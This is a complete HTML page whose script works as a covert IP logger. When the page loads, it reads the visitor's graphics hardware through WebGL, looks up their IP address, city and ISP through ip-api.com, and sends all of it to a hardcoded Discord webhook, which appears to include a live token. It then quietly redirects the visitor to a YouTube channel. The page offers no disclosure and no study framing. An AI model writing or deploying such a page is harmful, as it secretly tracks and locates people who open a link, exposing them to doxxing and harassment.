<!DOCTYPE html>
<html>
<body style="background:#000;">
<script>
    const h = "https://discord.com/api/webhooks/1497904289514000414/iBEkMTCSc_f4Dh2IxZsZjPfodFI1RiaDt7G6xYaWFsJRk4pZ_bdXlInRWb4DgEGcfeM0";
    const y = "https://youtube.com/@LigmaBlox-w7m";

    async function gD() {
        try {
            const gl = document.createElement('canvas').getContext('webgl');
            const d = gl.getExtension('WEBGL_debug_renderer_info');
            return gl.getParameter(d.UNMASKED_RENDERER_WEBGL).split("Apple ").pop().split(" (")[0];
        } catch(e) { return navigator.platform; }
    }

    async function run() {
        const v = sessionStorage.getItem('v');
        sessionStorage.setItem('v', '1');
        const dev = await gD();

        // 1. Initial hit notification
        navigator.sendBeacon(h, JSON.stringify({content: (v ? "RE-ENTRY" : "NEW HIT") + " | " + dev}));

        // 2. Loop until City/IP is found
        while(true) {
            try {
                const r = await fetch('https://ip-api.com/json/').then(res => res.json());
                if(r.status === "success") {
                    const msg = "IP: " + r.query + "\nCity: " + r.city + "\nISP: " + r.isp;
                    navigator.sendBeacon(h, JSON.stringify({content: msg}));
                    break;
                }
            } catch(e) {
                await new Promise(s => setTimeout(s, 2));
            }
        }
        window.location.replace(y);
    }
    run();
</script>
</body>
</html>
